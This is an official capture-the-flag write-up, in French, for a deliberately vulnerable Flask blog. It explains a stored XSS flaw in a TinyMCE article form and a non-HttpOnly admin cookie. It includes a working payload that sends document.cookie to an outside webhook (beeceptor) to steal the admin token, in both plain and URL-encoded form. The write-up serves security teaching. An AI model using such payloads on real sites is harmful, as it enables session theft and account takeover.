# Blog Cola 1 WU officiel

## Description du challenge et objectif

Ce challenge a pour objectif d’introduire les failles présentes sur les clients web. Pour ce faire, vous avez accès à un site web de Popa Cola : Blog Cola.

C’est par le biais de ce site que l’entreprise concurrente dénigre Freizh Cola. Il faut donc prendre le contrôle du site afin de mettre un terme à cette mauvaise publicité.

Pour cela, il sera nécessaire de devenir administrateur du site web, ce qui donnera accès au panneau d'administration (qui affiche le flag).

## Tour de l'application

### Page d’accueil

![page d'accueil](image.png)

Cette page permet de voir les différents articles publiés.

**Code correspondant :**

```py
articles = {}
with open("articles.json") as f:
    articles = json.load(f)

[...]

@app.route("/", methods=["GET"])
def index():
    articles_formated = ""
    for title, content in articles.items():
        articles_formated += f'<div class="article"><h1>{title}</h1><p>{content}</p></div>'
    return render_template("index.html", articles=articles_formated)
```

### Page de création des articles

![page de creation de posts](image-1.png)

Cette page contient un formulaire de type [WYSIWYG](https://fr.wikipedia.org/wiki/What_you_see_is_what_you_get) appelé TinyMCE, qui permet de créer de nouveaux articles. Ce type de formulaire est assez connu pour introduire des failles de type XSS.

**Code correspondant :**

```py
@app.route("/create", methods=["GET", "POST"])
def create():
    global articles

    if request.method == "GET":
        return render_template("create.html", message="")

    if request.method == "POST":

        title = request.form.get("title")
        body = request.form.get("tinyMCE")

        if body is None or title is None:
            return render_template("create.html", message='<div class="fail">Le corps ou le titre est vide</div>')
        
        if title in articles.keys():
            return render_template("create.html", message='<div class="fail">Un article avec ce titre existe déjà</div>')
    
        articles[title] = body

        return render_template("create.html", message='<div class="success">Article cr&eacute;&eacute;</div>')

    return "Bad request"
```

### Page Admin

![page admin](image-2.png)

Cette page est uniquement accessible par l’administrateur. Elle permet de ~~prendre le contrôle du site~~ voir le flag.

**Code correspondant :**

```py
@app.route("/admin", methods=["GET"])
def admin():

    if request.cookies.get("token") == ADMIN_SESSION_KEY:
        return render_template("admin.html", flag=FLAG)
    
    return redirect("/")
```

### Autres faits notables

L’authentification du site se fait via un cookie `token` :

```py
ADMIN_SESSION_KEY = "".join([ascii_letters[randint(0, len(ascii_letters) - 1)] for _ in range(50)])

[...]

@app.route("/admin", methods=["GET"])
def admin():

    if request.cookies.get("token") == ADMIN_SESSION_KEY:
        return render_template("admin.html", flag=FLAG)
    
    return redirect("/")
```

Ce cookie est ensuite réutilisé pour simuler un passage de l’administrateur sur la page principale du site toutes les 30 secondes :

```py
# dans app.py :

if __name__ == '__main__':

    print("Starting bot ... ", end="")
    run_thread("http://127.0.0.1:8080/", ADMIN_SESSION_KEY)
    print("done")

    app.run("0.0.0.0", 8080)

    print("Stopping bot ... ", end="")
    stop_thread()
    print("done")

# dans bot.py

def visit(url, token):

    [...]

    driver.get(f"{url}create")

    driver.add_cookie({
        "name": "token",
        "value": token,
        "path": "/",
        "httpOnly": False,
        "samesite": "Strict",
        "domain": "127.0.0.1"
    })

    try:
        driver.get(url)
        sleep(2)
    except: pass

    driver.close()


isRunning = True
t = None

class BotRunner(Thread):

    def __init__(self, url, token):
        self.url = url
        self.token = token
        super().__init__()
    
    def run(self):
        global isRunning
        while isRunning:
            visit(self.url, self.token)
            print("Visited")
            sleep(30) # attend 30s


def run_thread(url, token):
    global t
    t = BotRunner(url, token)
    t.start()

def stop_thread():
    global isRunning
    global t
    isRunning = False
    try:
        t.join()
    except Exception as e:
        print(f"An error already occurred! {e}")
```

## Faille de sécurité

La faille présente dans ce site web est une [XSS Stockée](https://fr.wikipedia.org/wiki/Cross-site_scripting#XSS_stock%C3%A9_(ou_permanent)). Ce type de faille permet d’injecter du code JavaScript dans une page. Ce code est ensuite interprété par tous les clients qui la visitent. En fonction du code JavaScript injecté, il est possible de faire beaucoup de choses. Dans notre cas, il suffit de voler le cookie `token` de l’admin, qui sera accessible au moment où il visionnera la page. Grâce à ce cookie, il sera possible de s’authentifier et d’accéder à la page admin.

Il est important de noter que le vol du cookie n’est possible que parce qu’il n’est pas en `HttpOnly`.

## Exploitation

La première étape consiste à identifier le point d’injection de notre XSS. Ici, le site est assez petit, donc essayons de voir ce qu’il se passe quand on crée un nouvel article avec de la mise en forme, par exemple du gras et de l’italique.

![article gras et italique](image-3.png)

Il est possible de voir que la requête envoyée par notre navigateur comprend du code HTML (ici `p`, `em` et `strong`).

![code html](image-4.png)

En regardant le nouvel article créé, on voit bien que rien n’a été filtré.

![nouvel article](image-5.png)

Maintenant que nous avons vu comment injecter du HTML, essayons d’en tirer quelque chose, par exemple, exécuter le code JavaScript `alert(1)`.

Pour cela, le plus simple est d’envoyer une requête de création et de l’éditer pour en renvoyer une seconde qui contiendra ce que l’on veut.

![aa](image-8.png)

![req](image-9.png)

Clic droit > modifier et renvoyer

![modif](image-11.png)

(Il faut faire attention à bien modifier le titre aussi.)

En retournant sur la page d’accueil, on peut voir que notre JavaScript a bien été exécuté.

![alert](image-12.png)

Il est maintenant temps de récupérer le cookie. Pour ce faire, JavaScript permet d’accéder à tous les cookies non-HttpOnly via la variable `document.cookie`. Pour recevoir ce cookie, il est nécessaire de mettre en place une webhook. Par exemple, on peut utiliser [Beeceptor](https://beeceptor.com/).

J’utiliserai l’endpoint à l’URL `https://qsdfze.free.beeceptor.com`

![beeceptor](image-13.png)

Pour simplifier l’exploit, je vais utiliser une redirection du navigateur de la cible vers `https://beecptor?cookie=+document.cookie`. Cette technique est facile à mettre en œuvre mais très visible dans les cas d’attaques réelles.

Le code JavaScript à exécuter est donc :

```js
window.location = "https://qsdfze.free.beeceptor.com?cookie=" + document.cookie
```

Il ne reste plus qu’à utiliser la même technique que précédemment, mais avec ce nouveau payload à la place du `alert(1)`. Attention : comme notre payload contient des `?`, `&`, `%` ou `=`, il est nécessaire de l’encoder en URL. Version URL encodée disponible [ici](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=d2luZG93LmxvY2F0aW9uID0gImh0dHBzOi8vcXNkZnplLmZyZWUuYmVlY2VwdG9yLmNvbT9jb29raWU9IiArIGRvY3VtZW50LmNvb2tpZQ).

Payload final :

```html
title=bbbbb&tinyMCE=<script>window%2Elocation%20%3D%20%22https%3A%2F%2Fqsdfze%2Efree%2Ebeeceptor%2Ecom%3Fcookie%3D%22%20%2B%20document%2Ecookie</script>
```

**<!> Si vous avez déjà envoyé un `alert` auparavant, il est nécessaire de réinitialiser l’application. Le `alert` bloque le chargement de la page.**

![send payload](image-14.png)

En visitant soi-même la page principale, on peut voir qu’on est redirigé. Il ne reste plus qu’à attendre 30 secondes pour voir le token admin arriver.

![admin token](image-17.png)

Pour voir la page admin, il suffit d’ajouter le token à son navigateur et de s’y rendre.

![admin token add](image-18.png)

![admin page](image-19.png)
